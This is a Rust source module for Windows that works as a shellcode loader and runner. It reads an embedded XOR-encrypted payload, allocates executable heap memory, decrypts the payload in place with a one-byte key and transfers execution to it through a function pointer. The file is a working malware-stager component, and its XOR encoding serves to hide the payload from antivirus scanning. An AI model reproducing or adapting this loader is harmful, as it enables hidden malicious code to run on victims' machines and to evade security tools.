//! Shellcode loading and execution module.
//!
//! Reads XOR-encrypted shellcode from an embedded binary, allocates
//! executable heap memory, decrypts in-place, and transfers execution.

use std::ptr::copy_nonoverlapping;
use std::mem::transmute;

use winapi::ctypes::c_void;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::heapapi::{HeapAlloc, HeapCreate};

use crate::utils::xor_decrypt;

/// XOR key used during encryption. Must match the key from the encoding step.
/// TODO: Consider embedding the key alongside the payload for automatic matching.
const XOR_KEY: u8 = 0x03;

/// Loads encrypted shellcode from the embedded binary, decrypts it in heap
/// memory, and executes it by casting the allocation to a function pointer.
///
/// # Safety
/// Uses raw pointer manipulation and transmutes a heap allocation to a
/// function pointer. The embedded binary must contain valid shellcode
/// encrypted with the matching XOR key.
pub fn execute() {
    let buffer = include_bytes!("encrypted.bin");

    unsafe {
        // Create a private, executable heap
        let heap = HeapCreate(0x40000, 0, 0);
        if heap.is_null() {
            return;
        }

        // Allocate a block large enough for the shellcode
        let ptr = HeapAlloc(heap, 0, buffer.len());
        if ptr.is_null() {
            return;
        }

        // Copy encrypted shellcode into the heap allocation
        copy_nonoverlapping(buffer.as_ptr(), ptr as *mut u8, buffer.len());

        if GetLastError() == 0 {
            // Decrypt shellcode in-place
            xor_decrypt(XOR_KEY, ptr, buffer.len());

            // Transfer execution to the decrypted shellcode
            let entry: fn() = transmute::<*mut c_void, fn()>(ptr);
            entry();
        }
    }
}
